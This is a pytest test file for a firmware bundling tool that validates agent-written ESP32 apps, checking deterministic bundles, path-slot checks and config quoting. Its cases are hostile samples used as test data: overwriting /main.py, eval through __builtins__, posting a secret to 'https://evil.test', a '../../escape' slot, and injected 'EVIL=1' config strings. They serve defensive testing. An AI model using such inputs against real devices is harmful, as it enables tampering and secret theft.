import io
import json
import zipfile

import pytest

from hardware import firmware_tools


def test_fixture_bundle_is_deterministic_and_complete():
    app = firmware_tools.reviewed_phone_snatch_app()
    files = firmware_tools.compile_bundle(
        app,
        build_id="fixture-build",
        ingest_url="http://localhost:8080/events",
    )
    manifest = firmware_tools.manifest_json(files, "fixture-build", "A")

    first = firmware_tools.bundle_zip(files, manifest)
    second = firmware_tools.bundle_zip(files, manifest)

    assert first == second
    assert not firmware_tools.validate_application(app)
    parsed = json.loads(manifest)
    assert parsed["schema"] == "wirejac.firmware.bundle/v1"
    assert len(parsed["files"]) == len(files)

    with zipfile.ZipFile(io.BytesIO(first)) as archive:
        assert "wirejac-manifest.json" in archive.namelist()
        assert "releases/A/app.py" in archive.namelist()
        assert "releases/A/drivers/mpu6050.py" in archive.namelist()


def test_reviewed_motion_test_app_is_valid_and_bounded():
    app = firmware_tools.reviewed_motion_test_app()

    assert firmware_tools.validate_application(app) == []
    assert "recording = not recording" in app
    assert '"motion.sample"' in app
    files = firmware_tools.compile_bundle(app, "motion-test")
    assert files["releases/A/app.py"] == app


@pytest.mark.parametrize(
    "source, expected",
    [
        ("def run():\n    eval('1 + 1')\n", "forbidden builtin 'eval'"),
        ("import subprocess\n\ndef run():\n    return None\n", "disallowed module"),
        (
            "def run():\n    open('/main.py', 'w').write('owned')\n",
            "forbidden builtin 'open'",
        ),
        (
            "import machine\n\ndef run():\n    machine.bootloader()\n",
            "forbidden operation 'bootloader'",
        ),
        (
            "from machine import reset\n\ndef run():\n    reset()\n",
            "forbidden machine operation 'reset'",
        ),
        (
            "def run():\n    writer = open\n    writer('/main.py', 'w')\n",
            "forbidden name 'open'",
        ),
        (
            "def run():\n    __builtins__['eval']('1 + 1')\n",
            "forbidden name '__builtins__'",
        ),
        (
            "import machine\n\ndef run():\n    machine.Pin(6, machine.Pin.OUT)\n",
            "Pin() must use a compiled PIN_* constant",
        ),
        (
            "from machine import Pin as P\n\ndef run():\n    P(6)\n",
            "aliases are forbidden",
        ),
        (
            "from wirejac_http import socket\n\ndef run():\n    return None\n",
            "imports disallowed name 'socket'",
        ),
        (
            "from wirejac_http import post_json\n\ndef run():\n"
            "    post_json('https://evil.test', {})\n",
            "must use compiled INGEST_URL",
        ),
        (
            "from wirejac_secrets import AUTHORIZATION\n"
            "from wirejac_events import emit\n\ndef run():\n"
            "    emit('leak', secret=AUTHORIZATION)\n",
            "may use AUTHORIZATION only",
        ),
        ("def helper():\n    return None\n", "must define run()"),
        ("def run(:\n    return None\n", "syntax error"),
    ],
)
def test_agent_application_rejects_unsafe_or_invalid_source(source, expected):
    assert any(
        expected in issue for issue in firmware_tools.validate_application(source)
    )


def test_bundle_rejects_path_or_slot_abuse():
    with pytest.raises(ValueError, match="slot must be A or B"):
        firmware_tools.compile_bundle(
            firmware_tools.reviewed_phone_snatch_app(),
            build_id="fixture-build",
            slot="../../escape",
        )


def test_config_values_are_python_literals_not_source_fragments():
    injected = 'http://ok/"; EVIL=1; INGEST_URL="'
    files = firmware_tools.compile_bundle(
        firmware_tools.reviewed_phone_snatch_app(),
        build_id='build"; EVIL=1; BUILD_ID="',
        ingest_url=injected,
    )

    config = files["releases/A/wirejac_config.py"]
    namespace = {}
    exec(compile(config, "wirejac_config.py", "exec"), {}, namespace)

    assert namespace["INGEST_URL"] == injected
    assert namespace["BUILD_ID"] == 'build"; EVIL=1; BUILD_ID="'
    assert "EVIL" not in namespace


@pytest.mark.parametrize("pin", [-1, 40, True, "21"])
def test_bundle_rejects_invalid_gpio_values(pin):
    with pytest.raises(ValueError, match="must be an ESP32 GPIO"):
        firmware_tools.compile_bundle(
            firmware_tools.reviewed_phone_snatch_app(),
            build_id="fixture-build",
            pin_led=pin,
        )
